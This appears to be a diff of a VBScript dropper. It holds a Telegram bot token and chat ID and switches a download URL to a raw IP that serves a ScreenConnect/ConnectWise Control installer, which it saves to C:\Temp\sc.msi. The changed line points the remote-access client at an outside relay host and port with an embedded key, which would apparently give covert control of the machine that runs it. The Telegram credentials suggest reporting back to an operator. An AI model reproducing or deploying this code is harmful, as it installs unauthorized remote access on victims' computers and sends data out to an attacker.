@@ -3,7 +3,7 @@ Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH, TEMP_DIR
 
 BOT_TOKEN   = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
 CHAT_ID     = "8345342738"
-PACKAGE_URL = "https://rgbxyzhosting.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=test&c=&c=&c=&c=&c=&c=&c="
+PACKAGE_URL = "http://66.250.98.195:8040/Bin/ConnectWiseControl.ClientSetup.msi?h=66.250.98.195&p=8041&k=BgIAAACkAABSU0ExAAgAAAEAAQDZKyH%2FdXOtMbwFdhElnpbaycxtxDgJ%2BUHj9bdSxOI57KFGqk5YDBzVYPqgdWTZ4ADf2X3l7JoD%2F34eliTQ44cFrAVClUG5syX6SVLzRSBb%2B0C2cz0egFMmoDtv%2FZObRN4PKPAZgYG3vtOF9UXDgDk9MdF0Tv5LRUPEBUvlyiWcYgCaCwef6Bwpr1Y8IsAdEm06YteBsUdTi80kCLpBu8CqW%2FpYhHEHpWzj91Sxkc3K4JzF3okpExFYpsubRgK1cTdAsA90BBQv%2FZoaDE8Cq%2FUYI2gA8Bgq3VrYXGTS6jh81tqAj3swEPCEvdHuaN8iOFTCWNow3yPf%2BG8tVu35zq64&e=Access&y=Guest&t=&c=&c=&c=&c=&c=&c=&c=&c="
 
 TEMP_DIR  = "C:\Temp"
 TEMP_PATH = TEMP_DIR & "\sc.msi"
